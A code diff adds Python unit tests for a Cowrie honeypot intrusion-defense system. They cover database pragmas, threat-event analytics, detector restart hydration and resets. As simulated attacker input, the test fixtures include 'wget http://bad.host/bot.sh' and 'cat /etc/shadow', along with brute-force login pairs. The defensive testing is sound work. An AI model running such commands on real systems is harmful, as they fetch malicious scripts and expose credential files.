@@ -78,6 +78,87 @@ class TestDefenseDatabase(unittest.TestCase):
         ))
         self.assertEqual(len(self.db.get_active_bans()), 0)
 
+    def test_sqlite_wal_mode_and_pragmas(self) -> None:
+        with self.db._get_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute("PRAGMA journal_mode;")
+            journal_mode = cursor.fetchone()[0]
+            # In SQLite, WAL mode is active when WAL is requested on file-based DBs
+            self.assertEqual(str(journal_mode).lower(), "wal")
+
+            cursor.execute("PRAGMA busy_timeout;")
+            busy_timeout = cursor.fetchone()[0]
+            self.assertGreaterEqual(int(busy_timeout), 5000)
+
+    def test_threat_event_persistence_and_analytics(self) -> None:
+        # Record a mixture of threat events
+        self.db.record_threat_event({
+            "timestamp": time.time(),
+            "src_ip": "198.51.100.99",
+            "dst_port": 2222,
+            "eventid": "cowrie.login.failed",
+            "attack_type": "brute_force",
+            "username": "root",
+            "password": "toor_password",
+        })
+        self.db.record_threat_event({
+            "timestamp": time.time(),
+            "src_ip": "198.51.100.99",
+            "dst_port": 2222,
+            "eventid": "cowrie.login.failed",
+            "attack_type": "brute_force",
+            "username": "admin",
+            "password": "admin_password",
+        })
+        self.db.record_threat_event({
+            "timestamp": time.time(),
+            "src_ip": "203.0.113.88",
+            "dst_port": 2222,
+            "eventid": "cowrie.command.input",
+            "attack_type": "exploit",
+            "input_command": "wget http://bad.host/bot.sh",
+        })
+        self.db.record_threat_event({
+            "timestamp": time.time(),
+            "src_ip": "198.51.100.77",
+            "dst_port": 2223,
+            "eventid": "cowrie.session.connect",
+            "attack_type": "probe",
+        })
+
+        analytics = self.db.get_persisted_threat_analytics()
+        self.assertEqual(analytics["total_threat_events"], 4)
+        self.assertEqual(analytics["attack_breakdown"]["brute_force"], 2)
+        self.assertEqual(analytics["attack_breakdown"]["exploit"], 1)
+        self.assertEqual(analytics["attack_breakdown"]["probe"], 1)
+        self.assertEqual(analytics["target_ports"]["2222"], 3)
+        self.assertEqual(analytics["target_ports"]["2223"], 1)
+
+        # Verify top usernames and passwords
+        users = dict(analytics["top_usernames"])
+        self.assertIn("root", users)
+        self.assertIn("admin", users)
+
+        # Verify query by IP
+        ip_events = self.db.get_threat_events_by_ip("198.51.100.99")
+        self.assertEqual(len(ip_events), 2)
+        self.assertEqual(ip_events[0]["src_ip"], "198.51.100.99")
+
+        # Verify recent events
+        recent = self.db.get_recent_threat_events(limit=10)
+        self.assertEqual(len(recent), 4)
+
+    def test_reset_database_clears_threat_events(self) -> None:
+        self.db.record_threat_event({
+            "timestamp": time.time(),
+            "src_ip": "198.51.100.99",
+            "attack_type": "brute_force",
+        })
+        self.assertEqual(self.db.get_persisted_threat_analytics()["total_threat_events"], 1)
+
+        self.db.reset_database()
+        self.assertEqual(self.db.get_persisted_threat_analytics()["total_threat_events"], 0)
+
 
 class TestIntrusionDetector(unittest.TestCase):
     def setUp(self) -> None:
@@ -174,6 +255,58 @@ class TestIntrusionDetector(unittest.TestCase):
         reset_res = self.detector.reset_all_bans()
         self.assertTrue(reset_res)
         self.assertEqual(len(self.firewall.list_banned_ips()), 0)
+
+    def test_detector_restart_hydration_and_forensics(self) -> None:
+        # Feed events into first detector instance
+        for i in range(3):
+            self.detector.process_event(CowrieEvent(
+                eventid="cowrie.login.failed",
+                src_ip="198.51.100.99",
+                username="admin",
+                password=f"p_{i}",
+            ))
+        self.detector.process_event(CowrieEvent(
+            eventid="cowrie.command.input",
+            src_ip="203.0.113.88",
+            input_command="cat /etc/shadow",
+        ))
+
+        analytics1 = self.detector.get_analytics()
+        self.assertEqual(analytics1["total_threat_events"], 4)
+        self.assertEqual(analytics1["attack_breakdown"]["brute_force"], 3)
+        self.assertEqual(analytics1["attack_breakdown"]["exploit"], 1)
+
+        # Simulate controller restart by creating a new detector instance with the same database
+        new_detector = IntrusionDetector(
+            firewall=self.firewall,
+            db=self.db,
+            allowlist=self.allowlist,
+        )
+
+        analytics2 = new_detector.get_analytics()
+        self.assertEqual(analytics2["total_threat_events"], 4)
+        self.assertEqual(analytics2["attack_breakdown"]["brute_force"], 3)
+        self.assertEqual(analytics2["attack_breakdown"]["exploit"], 1)
+        self.assertEqual(len(new_detector._events_history), 4)
+
+        # Verify forensic dossier retrieval for the IP survives restart
+        forensics = new_detector.get_ip_forensics("203.0.113.88")
+        self.assertEqual(forensics["src_ip"], "203.0.113.88")
+        self.assertEqual(forensics["total_events"], 1)
+
+    def test_reset_full_database_clears_db_and_memory(self) -> None:
+        self.detector.process_event(CowrieEvent(
+            eventid="cowrie.login.failed",
+            src_ip="198.51.100.99",
+            username="admin",
+            password="pwd",
+        ))
+        self.assertEqual(self.detector.get_analytics()["total_threat_events"], 1)
+
+        self.detector.reset_full_database()
+        self.assertEqual(self.detector.get_analytics()["total_threat_events"], 0)
+        self.assertEqual(self.db.get_persisted_threat_analytics()["total_threat_events"], 0)
+        self.assertEqual(len(self.detector._events_history), 0)
 
 
 if __name__ == "__main__":
